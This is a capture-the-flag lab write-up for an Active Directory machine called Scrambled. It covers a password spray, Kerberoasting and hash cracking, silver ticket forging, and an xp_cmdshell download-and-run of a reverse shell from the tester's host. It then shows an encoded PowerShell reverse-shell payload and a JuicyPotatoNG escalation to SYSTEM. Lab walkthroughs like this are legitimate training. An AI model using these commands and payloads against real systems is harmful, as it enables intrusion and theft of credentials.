## Scrambled

### Lab Details 

- Difficulty:
- Type: Active Directory, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-04 12:33:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2025-10-04T12:36:32+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-04T12:36:32+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-04T12:31:48
|_Not valid after:  2055-10-04T12:31:48
| ms-sql-info: 
|   10.129.156.215:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-10-04T12:36:32+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2025-10-04T12:36:32+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-04T12:36:32+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
```
- visit the app and we can find a username on `supportrequest.html` page
![[username on website.png]]
#### Initial Foothold 
- confirm the existence of the user with `kerbrute`
```bash
$ ./kerbrute userenum --dc 10.129.132.33 -d scrm.local users 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/05/25 - Ronnie Flathers @ropnop

2025/10/05 07:45:01 >  Using KDC(s):
2025/10/05 07:45:01 >  	10.129.132.33:88

2025/10/05 07:45:01 >  [+] VALID USERNAME:	 ksimpson@scrm.local
```
- `ksimpson@scrm.local` exists
- attempt password spray with username and password `ksimpson@scrm.local`
```bash
## also takes in a list of passwords
$ ./kerbrute passwordspray --dc 10.129.132.33 -d scrm.local users ksimpson

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/05/25 - Ronnie Flathers @ropnop

2025/10/05 07:46:47 >  Using KDC(s):
2025/10/05 07:46:47 >  	10.129.132.33:88

2025/10/05 07:46:47 >  [+] VALID LOGIN:	 ksimpson@scrm.local:ksimpson
2025/10/05 07:46:47 >  Done! Tested 1 logins (1 successes) in 0.022 seconds
```
- News and Alerts on `support.html` page states that all `NTLM` authentications are disabled, thus we will need to authenticate with `Kerberos`
![[alert.png]]
- first we will request a `TGT` ticket, use `impacket-getTGT` to get a ticket as `ksimpson`
```bash
impacket-getTGT -dc-ip 10.129.107.52 scrm/ksimpson:ksimpson
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ksimpson.ccache
```
- then we can use `impacket-GetNPUsers` to get 
```bash
$ impacket-GetNPUsers -k scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -request
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
```
- performs `ASREPRoasting` attack, it retrieves crackable password hashes for user accounts with "Do not require Kerberos preauthentication" enabled
- we have the hash of user `sqlsvc` and we can attempt to crack with `john`
```bash
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$297fa850e7d940105791a95726de74a9$532afa676c1f560de196fc8879e12bb79d0252f7441d59c2d38ccb694d4ba11d0db2e037a3aefc14e898f58aafedd771f4c986ab72af8ef7a7378a1d225a492e0f02841f127c898eabf90c45ef0dd92f5873215705d6ce29ee87f4a9c15dff26fb3e3eae191ce5e42fc0485ead64ba3a1908a29dfd65cfa57e81f252dd344820073c51438b74884b9c7ec485c9592cd198833982242bfd34e7b0ed547f41a9ff8fb26c82aaae49eeb1f4bb1e225d832e3a07706c10adbdc185ec48c28c879e4919ee09672608f1532dac6de3b8806c761b14462a090bc8a6a1f0219573b8f54aac24289b806a9061fec4968999100b7227f5c42cf7227c38284a7b0f4707140d414cc91828ce474faf615bf05a0efe575bed0efa174b8598adbef62cd6f8f4293d7752535f8da11456f57f85fd85f9266abc035777050fcdb59f4d7591fc453d5d1b11c4be85be0d15a35fc4f542e5085f7405b4e4091a79bf015f5d59b88cd312947e7dcffc1ac138640a9b71cfa4edd18dbed4dd19def19d3ec1f7c66c0cd838db1a79db8563e8953c459677174840c3f42073840c109f51512535bf62fe96d8c58aaba4c1d880f51d2132acc34687d68807cdd8bbdf3513ea1cbb122f905753f03b56c365f628e329d51be99a6ce1759aaba5b73c1c5693410a0e7a9d6bcdd08ba0977c3607bd92b2f4277efdb1e72f2508443310c0ef5a96b3252c60775b36f2197becec5463b56296edb9306d4b0aff25fb3196087654c108a232f6ff39a6463ee0493488a703ebd54647f1104cfe0fd8112dc98711ada6e6bff44561f3e66d41d53b8fe20e4379f5998a7a85a3c00dcf854eef69e50cba11abe3070020a68fefad19546aad05f1ed4fa1ab09d4c1e00e263b899d98d5e987ad40a36eb41da46bb614b9d6e906b4a951b331e48885f02b0036c5f88d54e9331e7a03c2cb0399289b7d987193645ad0ec14cd7df211b99aa6457be497c3f5d7c08f2d874005e8c95c7181e3984f76b958f9bcdfc51ec3d5aa97a3bc7a711de5378c94552bc62c21d89c4740bd57792439f58110d94e81d4e262cc707e007ec3bad0c926b8684a39575dff20901a087d9d289ba97fc1ef00891a3f76d69ec50f0a4cfeb9be09cb3bb89c6371f0b0a0fa66b79c62af08c76dcb4271bcf20aa84a39363c2ec6afced2026ad4842a7218f9683f20b50512f8105d9ab59d467720f5a590d010fc254440b6b859c4a42549f3ecad67dac365ac2e6b7f80de40ce50657e8e033800c1ca231bc8f9f03691e080a4b7417054f28748e4dd91ae1101efa83d46aadfab84859d6fa335d5dfd177f0401b47ab5c6dcd604aefd6b164a09b9c2327c2036358a5ecb51c5e8e76013065487364e2949294d8315de129a8e7d5e17d716b2ba8da3f0a7dd496d85c2486f17d799a13fe8d6c991d03a32f59d60dc7:Pegasus60
```

#### Lateral Movement (If any)
- get `TGT` ticket as `sqlsvc`
```bash
$ impacket-getTGT -dc-ip 10.129.107.52 scrm/sqlsvc:Pegasus60
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in sqlsvc.ccache
```
- we can attempt to perform silver ticket attack
- to perform the silver ticket attack against the SQL service we need three things:
	1. The NTLM hash of the password of the `SqlSvc` account.
	2. The domain SID.
	3. The `SPN` that the `SqlSvc` account is using.
- first will need to export the `ccache` file to be used for `Kerberos Authentication`
```bash
export KRB5CCNAME=./ksimpson.ccache
```
- then get NTLM hash using [this site](https://www.browserling.com/tools/ntlm-hash), we get the hash`B999A16500B87D17EC7F2E2A68778F05`
- run  `impacket-GetUserSPNs` to get user `SPN` 
```bash
$ impacket-GetUserSPNs -k scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -request -no-pass
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 11:32:02.351452  2025-10-06 06:49:57.753537             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 11:32:02.351452  2025-10-06 06:49:57.753537
<SNIP>
```
- then get domain SID using `impacket-getPac` 
```bash
$ impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson
<snip>
Domain SID: S-1-5-21-2743207045-1827831105-2542523200
<snip>
```
- perform `silver ticket attack`
```bash
impacket-ticketer -spn "MSSQLSvc/dc1.scrm.local" -user "ksimpson" -password "ksimpson" -nthash "B999A16500B87D17EC7F2E2A68778F05" -domain scrm.local -domain-sid "S-1-5-21-2743207045-1827831105-2542523200" -dc-ip dc1.scrm.local Administrator
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```
- to use the silver ticket we will need to export it 
```bash
$ KRB5CCNAME=Administrator.ccache mssqlclient.py -k dc1.scrm.local
```
- we can authenticate to `mssql` using `impacket-mssqlclient`
```bash
$ KRB5CCNAME=Administrator.ccache mssqlclient.py -k dc1.scrm.local
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands

SQL (SCRM\administrator  dbo@ScrambleHR)> select * from Employees;
EmployeeID   FirstName   Surname   Title   Manager   Role   
----------   ---------   -------   -----   -------   ----   
SQL (SCRM\administrator  dbo@ScrambleHR)> select * from UserImport;
LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   
--------   -----------------   ----------   ---------------   -------------   
MiscSvc    ScrambledEggs9900   scrm.local                90               0   
```
- we find the `MiscSvc`'s password in the database
- we can attempt enable `xp_cmdshell` to get reverse shell
```bash
SQL (SCRM\administrator  dbo@master)> xp_cmdshell powershell IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.82:8000/Invoke-ConPtyShell.ps1\");
```
- using [`Invoke-ConPtyShell.ps1`](https://github.com/antonioCoco/ConPtyShell/raw/refs/heads/master/Invoke-ConPtyShell.ps1)to get a have shell experience add below line to the end of the `powershell` file
```bash
Invoke-ConPtyShell 10.0.0.2 3001
## listener will look like below
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```
#### Privilege Escalation
- check user privilege
```bash
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
- user `sqlsvc` has `SeImpersonatePrivilege` enabled we can exploit using [`juicypotato`](https://github.com/antonioCoco/JuicyPotatoNG)
- we will need a bat file
- get reverse shell payload from [revshells](https://www.revshells.com/) using `powershell base64` and append `powershell -enc`
```bash
powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAAyACIALAA5ADAAMAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```
- load the bat file and `juicy potato`
```bash
PS C:\temp> wget http://10.10.14.82:8000/rev.bat -O rev.bat
PS C:\temp> ls


    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       06/10/2025     04:17         153600 jp.exe
-a----       06/10/2025     04:21           1353 rev.bat
```
- execute `juicy potato` 
```
PS C:\temp> .\jp.exe -t * -p C:\temp\rev.bat


         JuicyPotatoNG
         by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
[+] CreateProcessAsUser OK
[+] Exploit successful!
```
- we get admin reverse shell
```bash
$ nc -lnvp 9000
listening on [any] 9000 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.107.52] 55839

PS C:\> whoami
nt authority\system
```


#### Resources

#### Lesson Learned
